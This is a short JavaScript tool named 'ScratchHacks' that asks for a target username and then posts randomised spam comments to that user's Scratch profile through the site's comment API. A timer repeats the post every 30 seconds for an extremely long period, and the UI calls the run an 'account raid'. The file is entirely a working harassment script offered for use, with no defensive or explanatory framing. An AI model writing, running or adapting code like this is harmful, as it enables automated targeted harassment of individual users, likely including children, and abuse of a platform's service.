var accounttarget = "";
function starthacks() {
  alert("scratchhacks loaded");
document.write('<hr><br><center><h1>ScratchHacks</h1><h3>Beta 1</h3><br><a href="#" onclick="startcommentspam();"><h4>Start account raid</h4></a></center>');
}
 function dofunstuff(fn, timeout, interval) {
    var startTime = (new Date()).getTime();
    interval = interval || 1000;

    (function p() {
        fn();
        if (((new Date).getTime() - startTime ) <= timeout)  {
            setTimeout(p, interval);
        }
    })();
}
function makeid() {
  var text = "SPAM CURTOSY OF SCRATCHHACKS - Hello from Mosco! ";
  var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

  for (var i = 0; i < 5; i++)
    text += possible.charAt(Math.floor(Math.random() * possible.length));

  return text;
}

function ruinlifeplease() {
 $.post("https://scratch.mit.edu/site-api/comments/user/"+ accounttarget +"/add/", JSON.stringify({
      content: makeid(),
      parent_id: '',
      commentee_id: '',
    }), function(result){
      // It's all good :)
    });
}
function startcommentspam() {
  accounttarget = prompt("Please enter the username of the account to target", "HarryPotter123");
  document.write("<hr><br><center><h1>ScratchHacks</h1><h3>Spamming account! Do not close or do anything to this tab untill you think you've spammed enough.</h3></center>");
  dofunstuff(ruinlifeplease, 600000000, 30000);	
}
